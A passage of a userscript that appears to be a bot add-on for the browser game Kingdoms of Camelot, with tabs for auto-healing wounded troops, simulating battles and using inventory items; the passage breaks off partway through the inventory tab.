          <td>Keep Gold : <INPUT type=text id="pbapothecary_gold" size=6 value='+ApothecaryOptions.goldkeep+' /></td>\
          <td colspan=4><span id="pbapothecary_citysel"></span></td></tr><tr>\
          <td>Troop type : <SELECT id="pbapothecary_troops"><option value=0>--Select--</options>';
    for (y in unsafeWindow.unitcost)
        m += '<option value="'+y.substr(3)+'">'+unsafeWindow.unitcost[y][0]+'</option>';
    m += '</select></td>\
          <td>Min.: <INPUT id=pbapothecary_min type=text size=4 \></td>\
          <td><INPUT type=checkbox id=pbapothecary_maxcheck /> Max.: <INPUT id=pbapothecary_max type=text size=4 DISABLED \></td>\
          <td><INPUT type=submit id=pbapothecary_save value=Add /></td>';
    m += '</tr></table>';
    div.innerHTML = m;
    $("pbapothecary_gold").addEventListener('change', function(){
        ApothecaryOptions.goldkeep = parseIntNan(this.value);
    },false);
    $("pbapothecary_maxcheck").addEventListener('click', function(){
        $("pbapothecary_max").disabled = !($("pbapothecary_maxcheck").checked);
    },false);
    $("pbapothecary_save").addEventListener('click', function(){
        t.e_addqueue();
    },false);
    $("pbapothecary_power").addEventListener('click', function(){
        t.e_toggleswitch(this);
    },false);
    $("pbapothecary_show").addEventListener('click', function(){
        t.e_displayarray();
    },false);
    for (var cid in Cities.byID){
        var city = 'city'+cid;
        var x = Cities.byID[cid].idx;
        t.cities[x] = (getCityBuilding(cid, 21).count>0)?false: true;
		if(t.cities[x])
			t.cities[x] = (getCityBuilding(cid, 23).count>0)?false: true;
    }
    t.citysel = new CdispCityPicker ('pbapo_sel', document.getElementById("pbapothecary_citysel"), true, null, 0, t.cities);
    t.timer = setTimeout(t.loop,5000);
  },
  
  e_addqueue : function (){
    var t = Tabs.Apothecary;
    var city = t.citysel.city.idx;
    var troopsel = $("pbapothecary_troops").value;
    var min = parseIntNan($("pbapothecary_min").value);
    var max = parseIntNan($("pbapothecary_max").value);
    var max_sel = $("pbapothecary_maxcheck").checked;
    try {
        if((troopsel < 1 || min < 1) || (max_sel && max < 1) || (max_sel && (max < min)))
            throw "Incomplete/Invalid Input!";
        ApothecaryOptions.city[city].push({troop:troopsel,min:min,max:max,max_sel:max_sel});
        saveApothecaryOptions();
        $('pbapothecary_options').style.background ='#99FF99';
        setTimeout(function(){ ($('pbapothecary_options').style.background =''); }, 1000);
    } catch (e){
        $('pbapothecary_options').style.background ='#FF0000';
        setTimeout(function(){ ($('pbapothecary_options').style.background =''); }, 1000);
    }
  },
  
  e_displayarray : function(){
    var t = Tabs.Apothecary;
    if(t.pop == null)
        t.pop = new pbPopup('pbapothecary_pop',0,0,400,500,true,function(){t.pop.destroy(); t.pop = null;});
    t.pop.getTopDiv().innerHTML = '<DIV><center>Auto Heal Array</center></div>';
    var m = '<table><tr>';
    for (var city in ApothecaryOptions.city){
        if(!Cities.cities[city] || ApothecaryOptions.city[city].length < 1) continue;
        m += '<td colspan=2><b>'+Cities.cities[city].name+'</b></td>\
              <td>Minimum</td><td>Maximum</td><tr>';
        for(var i=0; i<ApothecaryOptions.city[city].length; i++){
            var info = ApothecaryOptions.city[city][i];
            m += '<td>'+(i+1)+'</td><td>'+unsafeWindow.unitcost['unt'+info.troop][0]+'</td>\
                  <td>'+info.min+'</td><td>'+info.max+'</td><td>'+strButton20('Edit','title="Apothecary edit" onclick="pbapo(this,'+i+','+city+')"')+'</td><td>'+strButton20('Delete','title="Apothecary delete" onclick="pbapo(this,'+i+','+city+')"')+'</td>';
            m += '</tr><tr>';
        }
        m += '</tr><tr>';
    }
    t.pop.getMainDiv().innerHTML = m;
    unsafeWindow.pbapo = t.display_action;
    t.pop.show(true);
  },
  
  display_action : function(obj,id,city){
    var t = Tabs.Apothecary;
    var evt = null;
    if(obj.title.indexOf("edit") > 0)
        evt = "edit";
    if(obj.title.indexOf("delete") > 0)
        evt = "delete";
    if(evt == null || id == null) return;
    if(evt == "delete"){
        ApothecaryOptions.city[city].splice(id,1);
    }
    if(evt == "edit"){
        t.display_edit(id,city);
    }
    saveApothecaryOptions();
    t.e_displayarray();
  },
  
  display_edit : function(id, city){
    var t = Tabs.Apothecary;
    if(t.pop2 == null)
        t.pop2 = new pbPopup('pbapodisp_pop',410,0,300,150,true,function(){t.pop2.destroy(); t.pop2 = null;});
    var m = '<table><tr><td><b>'+Cities.cities[city].name+'</b></td></tr>';
    var info = ApothecaryOptions.city[city][id];
    m += '<tr><td>Troop Type: </td><td>'+unsafeWindow.unitcost['unt'+info.troop][0]+'</td></tr>\
          <tr><td>Minimum: </td><td><INPUT id=pbapodisp_min type=text size=4 value="'+info.min+'" \>\
          <tr><td><INPUT type=checkbox id=pbapodisp_maxcheck '+(info.max_sel?'CHECKED':'')+' /> Maximum: </td><td><INPUT id=pbapodisp_max type=text size=4 value="'+info.max+'" '+(info.max_sel?'':'DISABLED')+' \></td></tr>\
          <tr><td><INPUT type=submit id=pbapodisp_save value=Save /></td></tr>';
    t.pop2.getMainDiv().innerHTML = m;
    t.pop2.show(true);
    $('pbapodisp_save').addEventListener('click', function(){
        var min = parseIntNan($("pbapodisp_min").value);
        var max = parseIntNan($("pbapodisp_max").value);
        var max_sel = $("pbapodisp_maxcheck").checked;
        if(min < 1 || (max_sel && max < 1) || (max_sel && (max < min))){
            alert("Invalid/Incorrect input!");
            return;
        }
        info.min = min;
        info.max = max;
        info.max_sel = max_sel;
        saveApothecaryOptions();
        t.pop2.show(false);
        t.e_displayarray();
    },false);
  },
  
  loop : function(){
    var t = Tabs.Apothecary;
    clearTimeout(t.timer);
    if(!ApothecaryOptions.Active) return;
    for (var city in ApothecaryOptions.city){
        if(!Cities.cities[city] || ApothecaryOptions.city[city].length < 1) continue;
        if(t.cities[city]) continue; //Skip if Apothecary doesn't exist
        if(Seed.queue_revive['city'+Cities.cities[city].id].length > 0) continue; //Skip city if queue is full
        if(Seed.citystats["city" + Cities.cities[city].id].gold[0] < parseInt(ApothecaryOptions.goldkeep)) continue; //Skip if gold is less than reserve
        for(var i=0; i<ApothecaryOptions.city[city].length; i++){
            var info = ApothecaryOptions.city[city][i];
            var cid = Cities.cities[city].id;
            var amt = 0;
            if(Seed.woundedUnits['city'+cid]['unt'+info.troop] < info.min) continue;
            if(Seed.woundedUnits['city'+cid]['unt'+info.troop] > info.max && info.max_sel){
                amt = info.max;
            } else {
                amt = Seed.woundedUnits['city'+cid]['unt'+info.troop];
            }
            if(cid > 0 && info.troop > 0 && amt > 0){
                t.do_revive(cid,info.troop,amt);
                break;
            }
        }
    }
    t.timer = setTimeout(t.loop, 10000);
  },
  
  e_toggleswitch : function(obj){
    var t = Tabs.Apothecary;
    if(ApothecaryOptions.Active){
        obj.value = "Auto Heal = OFF";
        ApothecaryOptions.Active = false;
        clearTimeout(t.timer);
    } else {
        obj.value = "Auto Heal = ON";
        ApothecaryOptions.Active = true;
        t.timer = setTimeout(t.loop,5000);
    }
    saveApothecaryOptions();
  },
  
  do_revive : function(currentcityid,unitId,num,notify){
    var t = Tabs.Apothecary;
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.cid = currentcityid;
    params.type = unitId;
    params.quant = num;
    params.apothecary = true;
    var time = unsafeWindow.cm.RevivalModel.getRevivalStats(unitId, num).time;

    var profiler = new unsafeWindow.cm.Profiler("ResponseTime", "train.php");
    new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/train.php" + unsafeWindow.g_ajaxsuffix, {
        method: "post",
        parameters: params,
        onSuccess: function(rslt) {
            profiler.stop();
          if (rslt.ok) {
            for (var i = 1; i < 5; i++) {
                var resourceLost = parseInt(unsafeWindow.unitcost["unt" + unitId][i]) * 3600 * parseInt(num);
                if(rslt.gamble) resourceLost = resourceLost*rslt.gamble[i];
                unsafeWindow.seed.resources["city" + currentcityid]["rec" + i][0] = parseInt(unsafeWindow.seed.resources["city" + currentcityid]["rec" + i][0]) - resourceLost;
            }
            if (!rslt.initTS) {
                rslt.initTS = unixTime() - 1;
            }
            Seed.queue_revive["city" + currentcityid].push([unitId, num, rslt.initTS, parseInt(rslt.initTS) + time, 0, time, null]);
            var cost = unsafeWindow.cm.RevivalModel.getRevivalStats(unitId, num).cost;
            Seed.citystats["city" + currentcityid].gold[0] -= parseInt(cost);
            unsafeWindow.update_gold();
            unsafeWindow.cm.WoundedModel.sub(unitId, num);
          } else {
            
          }
        },
      onFailure: function () {profiler.stop();}
    });
  },
  
  hide : function (){
    var t = Tabs.Apothecary;
  },
  
  show : function (){
    var t = Tabs.Apothecary;
  },
}

/******************* Combat Tab **********************/
Tabs.Combat = {
    myDiv: null,
	  tabDisabled : !ENABLE_SAMPLE_TAB,
    tabOrder: 400,
    troops: [{},{}], //Array[Defender, Attacker]
    active: [{},{}],
    lost: [{},{}],
    total: [],
    stats: unsafeWindow.unitstats,   //  Life, Attack, Defense, Speed, Range, Load
    priority: [[3,7,8,4,5,6,2,1,9,11,10,12],[12,10,6,3,7,8,4,5,2,1,9,11]],
    round: 0,
    range: [0,0,0], //[Defender, Attacker, Max]
    distance: [{},{}], // [Defender, Attacker]
    speed: [0,0], // [Defender max, Attacker max]
    start: 0,
    pop : null,
    
    init: function(div){
        var t = Tabs.Combat;
        t.myDiv = div;
        var m = '<table><TR><TD colspan=2><b>Attacking</b>&nbsp;&nbsp;<INPUT id=pbcombat_1 type=submit value=Research></td><TD colspan=2><b>Defending</b>&nbsp;&nbsp;<INPUT id=pbcombat_0 type=submit value=Research></td></TR>';
        for(var troops in unsafeWindow.unitcost){
            var name = unsafeWindow.unitcost[troops][0];
            m+='<tr><td>'+name+' :</td><td><input type=text id="pbcombata_'+troops+'" /></td><td>'+name+' :</td><td><input type=text id="pbcombatd_'+troops+'" /></td></tr>';
        }
        m+='</table><DIV id=pbcombat_rslt></div>';
        t.myDiv.innerHTML = m;
        
        for(var troops in unsafeWindow.unitcost){
            document.getElementById('pbcombata_'+troops).addEventListener('change', t.e_calculate, false);
            document.getElementById('pbcombatd_'+troops).addEventListener('change', t.e_calculate, false);
        }
        document.getElementById('pbcombat_1').addEventListener('click', function() t.e_research(1),false);
        document.getElementById('pbcombat_0').addEventListener('click', function() t.e_research(0),false);
    },
    
    e_research : function(side){
        var t = Tabs.Combat;
        t.pop = new pbPopup ('pbcombatresearch', 0, 0, 270, 250, true, function(){t.c_ratio(); t.pop.destroy();});
        t.pop.centerMe (mainPop.getMainDiv());
        t.pop.getTopDiv().innerHTML = '<CENTER><B>Research Levels</b>: '+ (side?'Attacker':'Defender') +'</center>';
        var m = '<DIV><TABLE>';
        for(var k in CombatOptions.research[side]){
            m += '<TR><TD>'+unsafeWindow.techcost[k][0]+':</td><td><input id="pbcombat_'+k+'" /></td></tr>';
        }
        m += '<TR><TD>Knight Combat:</td><td><input id="pbcombat_knt" value='+ CombatOptions.knt[side] +' /></td></tr>';
        m += '<TR><TD>Guardian: </td><td> \
              <table><tr><td>Type: </td><td>'+ htmlSelector({wood:'Wood',ore:'Ore'},CombatOptions.guardian[side][0],'id=pbcombat_guartype') +'</td></tr><tr>\
              <td>Level: </td><td><input id="pbcombat_guarlvl" value='+ CombatOptions.guardian[side][1] +' size=4 /></td></tr></table>\
              </td></tr>';
        m += '<TR><TD colspan=2><CENTER><button id=pbcombatresearchsave>Save</button></CENTER></td></tr></table></div>';
        t.pop.getMainDiv().innerHTML = m;
        t.pop.centerMe (mainPop.getMainDiv());
        t.pop.show (true);
        for(var k in CombatOptions.research[side]){
            t.e_saveresearch('pbcombat_'+k, k, side);
        }
        document.getElementById('pbcombat_knt').addEventListener('change',function(){
            CombatOptions.knt[side] = parseInt(document.getElementById('pbcombat_knt').value);
            saveCombatOptions();
        },false);
        document.getElementById('pbcombat_guartype').addEventListener('change',function(){
            CombatOptions.guardian[side][0] = document.getElementById('pbcombat_guartype').value;
            saveCombatOptions();
        },false);
        document.getElementById('pbcombat_guarlvl').addEventListener('change',function(){
            CombatOptions.guardian[side][1] = parseInt(document.getElementById('pbcombat_guarlvl').value);
            saveCombatOptions();
        },false);
        document.getElementById('pbcombatresearchsave').addEventListener('click',t.c_ratio,false);
    },
    
    e_saveresearch : function(checkboxId, optionName, side){
        var t = Tabs.Combat;
        var checkbox = document.getElementById(checkboxId);
        if (CombatOptions.research[side][optionName])
          checkbox.value = CombatOptions.research[side][optionName];
        checkbox.addEventListener ('change', new eventToggle(checkboxId, optionName, side).handler, false);
        function eventToggle (checkboxId, optionName, side){
          this.handler = handler;
          var optName = optionName;
          function handler(event){
            CombatOptions.research[side][optionName] = parseInt(this.value);
            saveCombatOptions();
          }
        }
    },
    
    c_ratio : function (){
        var t = Tabs.Combat;
        for(var k in CombatOptions.ratio[0]){
            var attack = parseFloat(t.c_attack(k,0));
            for(var tr in unsafeWindow.unitcost){
                var defense = parseFloat(t.c_defense(tr,1));
                var life = parseFloat(t.c_life(tr,1));
                var ratio = ((life+defense)/attack);
                CombatOptions.ratio[0][k][tr] = ratio.toFixed(20);
            }
        }
        for(var k in CombatOptions.ratio[1]){
            var attack = parseFloat(t.c_attack(k,1));
            for(var tr in unsafeWindow.unitcost){
                var defense = parseFloat(t.c_defense(tr,0));
                var life = parseFloat(t.c_life(tr,0));
                var ratio = ((life+defense)/attack);
                CombatOptions.ratio[1][k][tr] = ratio.toFixed(20);
            }
        }
    },
    
    e_calculate: function(){
        var t = Tabs.Combat;
        t.round = 0;
        t.total[0] = 0;
        t.total[1] = 0;
        t.range[0] = 0
        t.range[1] = 0;
        t.speed[0] = 0;
        t.speed[1] = 0;
        for(var tr in unsafeWindow.unitcost){
            var name = unsafeWindow.unitcost[tr][0];
            t.troops[0][tr] = parseIntNan(document.getElementById('pbcombatd_'+tr).value);
            t.troops[1][tr] = parseIntNan(document.getElementById('pbcombata_'+tr).value);
            t.total[0] += t.troops[0][tr];
            t.total[1] += t.troops[1][tr];
            t.lost[0][tr] = 0;
            t.lost[1][tr] = 0;
            t.active[0][tr] = 0;
            t.active[1][tr] = 0;
            if(t.troops[0][tr]>0 && parseInt(t.stats[tr][4]) > t.range[0]) t.range[0] = parseInt(t.stats[tr][4]);
            if(t.troops[1][tr]>0 && parseInt(t.stats[tr][4]) > t.range[1]) t.range[1] = parseInt(t.stats[tr][4]);
            if(t.troops[0][tr]>0 && parseInt(t.stats[tr][3]) > t.speed[0]) t.speed[0] = parseInt(t.stats[tr][3]);
            if(t.troops[1][tr]>0 && parseInt(t.stats[tr][3]) > t.speed[1]) t.speed[1] = parseInt(t.stats[tr][3]);
        }
        if(t.range[1]>t.range[0]){
            t.start = 1; //Attacker starts first if range is longer than defender
            t.range[2] = t.range[1];
        } else {
            t.start = 0;
            t.range[2] = t.range[0];
        }
        for(var tr in unsafeWindow.unitcost){
            if(t.troops[0][tr]>0)
                t.distance[0][tr] = parseInt(t.range[2]/((t.speed[1]/t.speed[0])+1));
            else
                t.distance[0][tr] = 0;
            if(t.troops[1][tr]>0)
                t.distance[1][tr] = parseInt(t.range[2]/((t.speed[0]/t.speed[1])+1));
            else
                t.distance[1][tr] = 0;
        }
        t.c_rounds();
    },
    
    c_rounds: function(){
        var t = Tabs.Combat;
        if(t.total[0]<1 || t.total[1]<1 || t.round>99){
            t.print();
            return;
        }
        t.round++;
        if(t.round>1){
            for(var tr in t.distance[0]){
                t.distance[0][tr] -= t.stats[tr][3];
                if(t.distance[0][tr] < 1) t.distance[0][tr] = 0;
            }
            for(var tr in t.distance[1]){
                t.distance[1][tr] -= t.stats[tr][3];
                if(t.distance[1][tr] < 1) t.distance[1][tr] = 0;
            }
        }
        t.c_remainder();
    },
    
    c_remainder: function(){  //  Life, Attack, Defense, Speed, Range, Load
        var t = Tabs.Combat;
        for(var tr in t.troops[0]){ //Only troops in range are counted
            if(t.stats[tr][4] >= (t.distance[0][tr]))
                t.active[0][tr] = t.troops[0][tr];
        }
        for(var tr in t.troops[1]){
            if(t.stats[tr][4] >= (t.distance[1][tr]))
                t.active[1][tr] = t.troops[1][tr];
        }
        //Defender
        for(var tr in t.active[0]){
            if(t.active[0][tr] < 1) continue;
            var range = t.stats[tr][4] - t.distance[0][tr];
            var count = 0;
            var type = 0;
            if(tr == 'unt6' || tr == 'unt10' || tr == 'unt12') type = 1;
            // GM_log('side0 '+type);
            while(t.active[0][tr] > 0 && count<t.priority[type].length){
                var trr = 'unt'+t.priority[type][count];
                if((t.troops[1][trr] < 1) || (range < t.distance[1][trr])){
                    count++;
                    continue;
                }
                if(parseInt(CombatOptions.ratio[0][tr][trr]) < 1){
                    if(t.active[0][tr] > t.troops[1][trr]){
                        t.active[0][tr] -= t.troops[1][trr];
                        t.lost[1][trr] += t.troops[1][trr];
                        t.total[1] -= t.troops[1][trr];
                        t.troops[1][trr] = 0;
                    }else {
                        t.lost[1][trr] += t.active[0][tr];
                        t.total[1] -= t.active[0][tr];
                        t.troops[1][trr] -= t.active[0][tr];
                        t.active[0][tr] = 0;
                    }
                } else {
                    var killed = parseInt(t.active[0][tr]/CombatOptions.ratio[0][tr][trr]);
                    if(killed > t.troops[1][trr]){
                        t.lost[1][trr] += t.troops[1][trr];
                        t.total[1] -= t.troops[1][trr];
                        t.active[0][tr] -= parseInt(CombatOptions.ratio[0][tr][trr]* t.troops[1][trr]);
                        t.troops[1][trr] = 0;
                    } else {
                        t.lost[1][trr] += killed;
                        t.total[1] -= killed;
                        t.troops[1][trr] -= killed;
                        t.active[0][tr] = 0;
                    }
                }
                count++;
            }
        }
        
        //Attacker
        for(var tr in t.active[1]){
            if(t.active[1][tr] < 1) continue;
            var range = t.stats[tr][4] - t.distance[1][tr];
            var count = 0;
            var type = 0;
            if(tr == 'unt6' || tr == 'unt10' || tr == 'unt12') type = 1;
            // GM_log('side1 '+type);
            while(t.active[1][tr] > 0 && count<t.priority[type].length){
                var trr = 'unt'+t.priority[type][count];
                if((t.troops[0][trr] < 1) || (range < t.distance[0][trr])){
                    count++;
                    continue;
                }
                if(parseInt(CombatOptions.ratio[1][tr][trr]) < 1){
                    if(t.active[1][tr] > t.troops[0][trr]){
                        t.active[1][tr] -= t.troops[0][trr];
                        t.lost[0][trr] += t.troops[0][trr];
                        t.total[0] -= t.troops[0][trr];
                        t.troops[0][trr] = 0;
                    }else {
                        t.lost[0][trr] += t.active[1][tr];
                        t.total[0] -= t.active[1][tr];
                        t.troops[0][trr] -= t.active[1][tr];
                        t.active[1][tr] = 0;
                    }
                } else {
                    var killed = parseInt(t.active[1][tr]/CombatOptions.ratio[1][tr][trr]);
                    if(killed > t.troops[0][trr]){
                        t.lost[0][trr] += t.troops[0][trr];
                        t.total[0] -= t.troops[0][trr];
                        t.active[1][tr] -= parseInt(CombatOptions.ratio[1][tr][trr]* t.troops[0][trr]);
                        t.troops[0][trr] = 0;
                    } else {
                        t.lost[0][trr] += killed;
                        t.total[0] -= killed;
                        t.troops[0][trr] -= killed;
                        t.active[1][tr] = 0;
                    }
                }
                count++;
            }
        }
        t.c_rounds();
    },
    
    c_attack: function(tr,side){
        var t = Tabs.Combat;
        var att = t.stats[tr][1];
        if(CombatOptions.research[side].tch8) //Add Poison Edge
            att += t.stats[tr][1]*parseFloat(CombatOptions.research[side].tch8*5/100);
        if(CombatOptions.guardian[side][0] == 'ore' && side == 1){ //Add Guardian Boost
            var boost = 0;
            switch(CombatOptions.guardian[side][1]){
                case 1:
                    boost = 0.02;
                    break;
                case 2:
                    boost = 0.04;
                    break;
                case 3:
                    boost = 0.06;
                    break;
                case 4:
                    boost = 0.08;
                    break;
                case 5:
                    boost = 0.12;
                    break;
                case 6:
                    boost = 0.16;
                    break;
                case 7:
                    boost = 0.20;
                    break;
                case 8:
                    boost = 0.26;
                    break;
                case 9:
                    boost = 0.32;
                    break;
                case 10:
                    boost = 0.40;
                    break;
                default:
                    boost = 0;
            }
            att += t.stats[tr][1]*boost;
        }
        if(CombatOptions.knt[side]) //Add knight boost
            att += t.stats[tr][1]*parseFloat((CombatOptions.knt[side]/2)/100);
        // logit('side'+side+' '+tr+' att'+att);
        return att;
    },
    c_defense: function(tr,side){
        var t = Tabs.Combat;
        var def = t.stats[tr][2];
        if(CombatOptions.research[side].tch9) //Add Metal Alloy
            def += t.stats[tr][2]*parseFloat(CombatOptions.research[side].tch9*5/100);
        if(CombatOptions.knt[side]) //Add knight boost
            def += t.stats[tr][2]*parseFloat((CombatOptions.knt[side]/2)/100);
        // logit('side'+side+' '+tr+' def'+def);
        return def;
    },
    c_life: function(tr,side){
        var t = Tabs.Combat;
        var life = t.stats[tr][0];
        if(CombatOptions.research[side].tch15) //Add Healing Potions
            life += t.stats[tr][0]*parseFloat(CombatOptions.research[side].tch15*5/100);
        if(CombatOptions.guardian[side][0] == 'wood' && side == 0){ //Add Guardian Boost
            var boost = 0;
            switch(CombatOptions.guardian[side][1]){
                case 1:
                    boost = 0.01;
                    break;
                case 2:
                    boost = 0.02;
                    break;
                case 3:
                    boost = 0.03;
                    break;
                case 4:
                    boost = 0.04;
                    break;
                case 5:
                    boost = 0.06;
                    break;
                case 6:
                    boost = 0.08;
                    break;
                case 7:
                    boost = 0.10;
                    break;
                case 8:
                    boost = 0.13;
                    break;
                case 9:
                    boost = 0.16;
                    break;
                case 10:
                    boost = 0.20;
                    break;
                default:
                    boost = 0;
            }
            life += t.stats[tr][0]*boost;
        }
        // logit('side'+side+' '+tr+' life'+life);
        return life;
    },
    
    print: function (){
        var t = Tabs.Combat;
        var m = '<div class=pbStat>Results</div><table><TR><TD colspan=3><b>Attacking</b></td><TD colspan=3><b>Defending</b></td><TD>Rounds :'+t.round+'</td></TR>';
        for(var tr in unsafeWindow.unitcost){
            var name = unsafeWindow.unitcost[tr][0];
            m+='<tr><td>'+name+' :</td><td>'+ t.troops[1][tr] +'</td><td><span class=boldRed>'+ t.lost[1][tr] +'</span></td><td>'+name+' :</td><td>'+ t.troops[0][tr] +'</td><td><span class=boldRed>'+ t.lost[0][tr] +'</span></td></tr>';
        }
        m+='</table>';
        document.getElementById('pbcombat_rslt').innerHTML = m;
    },
    show: function(){
    
    },
    
    hide: function(){
    
    },
}

/**************************** Inventory Tab ****************************************/
Tabs.Inventory = {
	myDiv: null,
	  tabDisabled : !ENABLE_SAMPLE_TAB,
	general: [],
	combat: [],
	resources: [],
	chest: [],
	court: [],
	type: null,
	queue:[],
	isBusy:false,
	counter:0,
	max:0,
	
	init: function(div){
		var t = Tabs.Inventory;
		t.myDiv = div;
		
		var m = "<DIV class=pbStat>Inventory Tab</div>\
				<CENTER><span class=boldRed>***Use at own risk***</span></center>\
				<TABLE width=100% ><TR>\
				<TD width=50%><input type=submit id=pbinventory_general value='General' />\
					<input type=submit id=pbinventory_combat value='Combat' />\
					<input type=submit id=pbinventory_resources value='Resources' />\
					<input type=submit id=pbinventory_chest value='Chest' />\
					<input type=submit id=pbinventory_court value='Court' /></td>\
				<TD width=50% align=center ><input type=submit id=pbinventory_start value='Start' /></td>\
					</tr></table>\
				<DIV class=pbStat>Items</div>\
				<DIV id=pbinventory></div>\
				<DIV id=pbinventory_info></div>";
		t.myDiv.innerHTML = m;
		t.sort_Items();
		
		$("pbinventory_general").addEventListener('click', t.display_general, false);
		$("pbinventory_combat").addEventListener('click', t.display_combat, false);
		$("pbinventory_resources").addEventListener('click', t.display_resources, false);
		$("pbinventory_chest").addEventListener('click', t.display_chest, false);
		$("pbinventory_court").addEventListener('click', t.display_court, false);
		$("pbinventory_start").addEventListener('click', t.start, false);
		
		$("pbinventory_general").click();
	},
	
	sort_Items : function (){
		var t = Tabs.Inventory;
		for(var k in unsafeWindow.ksoItems){
			var item = unsafeWindow.ksoItems[k];
			if(item.count > 0 && item.usable){
				if(item.category == 1){
					t.general.push(item);
				}
				if(item.category == 3){
					t.combat.push(item);
				}
				if(item.category == 4){
					t.resources.push(item);
				}
				if(item.category == 5){
					t.chest.push(item);
				}
				if(item.category == 6){
					t.court.push(item);
				}
				
			}
		}
	},
	
	display_general : function (){
		var t = Tabs.Inventory;
		t.type = "general";
		var div = document.getElementById("pbinventory");
		var count = 0;
		var m = "<TABLE>";
		m += "<TR><TD></td><TD>Name</td><TD>Use</td><TD>Count</td><TD width='10px'>&nbsp;</td><TD></td><TD>Name</td><TD>Use</td><TD>Count</td><TD width='20px'>&nbsp;</td><TD></td><TD>Name</td><TD>Use</td><TD>Count</td></tr><TR>";
		for (var k in t.general){
			var item = t.general[k];
			if(!item.name) continue;
			m += (count%3 == 0)?"<TR>":"<TD width='10px'>&nbsp;</td>";
			m += "<TD><input type=checkbox class='pbinv_general' data-ft='"+JSON.stringify(item)+"' /></td>";
			m += "<TD><img width='20px' height='20px' src='https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+item.id+".jpg' /> "+item.name+"</td>";
			m += "<TD><input type=text size=3 id='pb_inv_general_"+item.id+"' /></td>";
			m += "<TD>"+item.count+"</td>";
			m += (count%3 == 2)?"</tr>":"";
			count++;
		}
		m += "</table>";
		div.innerHTML = (count!=0)?m:"<CENTER>No useable items in this category</CENTER>";
	},
	display_combat : function (){
		var t = Tabs.Inventory;
		t.type = "combat";
		var div = document.getElementById("pbinventory");
		var count = 0;
		var m = "<TABLE>";
		m += "<TR><TD></td><TD>Name</td><TD>Use</td><TD>Count</td><TD width='10px'>&nbsp;</td><TD></td><TD>Name</td><TD>Use</td><TD>Count</td><TD width='20px'>&nbsp;</td><TD></td><TD>Name</td><TD>Use</td><TD>Count</td></tr><TR>";
		for (var k in t.combat){
			var item = t.combat[k];
			if(!item.name) continue;
			m += (count%3 == 0)?"<TR>":"<TD width='10px'>&nbsp;</td>";
			m += "<TD><input type=checkbox class='pbinv_combat' data-ft='"+JSON.stringify(item)+"' /></td>";
			m += "<TD><img width='20px' height='20px' src='https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+item.id+".jpg' /> "+item.name+"</td>";
			m += "<TD><input type=text size=3 id='pb_inv_combat_"+item.id+"' /></td>";
			m += "<TD>"+item.count+"</td>";
			m += (count%3 == 2)?"</tr>":"";
			count++;
		}
		m += "</table>";
		div.innerHTML = (count!=0)?m:"<CENTER>No useable items in this category</CENTER>";
	},
	display_resources : function (){
		var t = Tabs.Inventory;
		t.type = "resources";
		var div = document.getElementById("pbinventory");
		var count = 0;
		var m = "<TABLE>";
		m += "<TR><TD></td><TD>Name</td><TD>Use</td><TD>Count</td><TD width='10px'>&nbsp;</td><TD></td><TD>Name</td><TD>Use</td><TD>Count</td><TD width='20px'>&nbsp;</td><TD></td><TD>Name</td><TD>Use</td><TD>Count</td></tr><TR>";
		for (var k in t.resources){
			var item = t.resources[k];
			if(!item.name) continue;
			m += (count%3 == 0)?"<TR>":"<TD width='10px'>&nbsp;</td>";
			m += "<TD><input type=checkbox class='pbinv_resources' data-ft='"+JSON.stringify(item)+"' /></td>";
			m += "<TD><img width='20px' height='20px' src='https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+item.id+".jpg' /> "+item.name+"</td>";
			m += "<TD><input type=text size=3 id='pb_inv_resources_"+item.id+"' /></td>";
			m += "<TD>"+item.count+"</td>";
			m += (count%3 == 2)?"</tr>":"";
			count++;
		}
		m += "</table>";
		div.innerHTML = (count!=0)?m:"<CENTER>No useable items in this category</CENTER>";
	},
	display_chest : function (){
		var t = Tabs.Inventory;
		t.type = "chest";
		var div = document.getElementById("pbinventory");
		var count = 0;
		var m = "<TABLE>";
		m += "<TR><TD></td><TD>Name</td><TD>Use</td><TD>Count</td><TD width='10px'>&nbsp;</td><TD></td><TD>Name</td><TD>Use</td><TD>Count</td><TD width='20px'>&nbsp;</td><TD></td><TD>Name</td><TD>Use</td><TD>Count</td></tr><TR>";
		for (var k in t.chest){
			var item = t.chest[k];
			if(!item.name) continue;
			m += (count%3 == 0)?"<TR>":"<TD width='10px'>&nbsp;</td>";
			m += "<TD><input type=checkbox class='pbinv_chest' data-ft='"+JSON.stringify(item)+"' /></td>";
			m += "<TD><img width='20px' height='20px' src='https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+item.id+".jpg' /> "+item.name+"</td>";
			m += "<TD><input type=text size=3 id='pb_inv_chest_"+item.id+"' /></td>";
			m += "<TD>"+item.count+"</td>";
			m += (count%3 == 2)?"</tr>":"";
			count++;
		}
		m += "</table>";
		div.innerHTML = (count!=0)?m:"<CENTER>No useable items in this category</CENTER>";
	},
	display_court : function (){
		var t = Tabs.Inventory;
		t.type = "court";
		var div = document.getElementById("pbinventory");
		var count = 0;
		var m = "<TABLE>";
		m += "<TR><TD></td><TD>Name</td><TD>Use</td><TD>Count</td><TD width='10px'>&nbsp;</td><TD></td><TD>Name</td><TD>Use</td><TD>Count</td><TD width='20px'>&nbsp;</td><TD></td><TD>Name</td><TD>Use</td><TD>Count</td></tr><TR>";
		for (var k in t.court){
			var item = t.court[k];
			if(!item.name) continue;
			m += (count%3 == 0)?"<TR>":"<TD width='10px'>&nbsp;</td>";
			m += "<TD><input type=checkbox class='pbinv_court' data-ft='"+JSON.stringify(item)+"' /></td>";
			m += "<TD><img width='20px' height='20px' src='https://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/70/"+item.id+".jpg' /> "+item.name+"</td>";
			m += "<TD><input type=text size=3 id='pb_inv_court_"+item.id+"' /></td>";
			m += "<TD>"+item.count+"</td>";
			m += (count%3 == 2)?"</tr>":"";
			count++;
		}
		m += "</table>";
		div.innerHTML = (count!=0)?m:"<CENTER>No useable items in this category</CENTER>";
	},
	
	start : function (){
		var t = Tabs.Inventory;
		if(t.isBusy){
			t.isBusy = false;
			$("pbinventory_start").value = "Start";
		} else {
			t.isBusy = true;
			$("pbinventory_start").value = "Stop";
			t.queue = [];
			$("pbinventory_info").innerHTML = "";
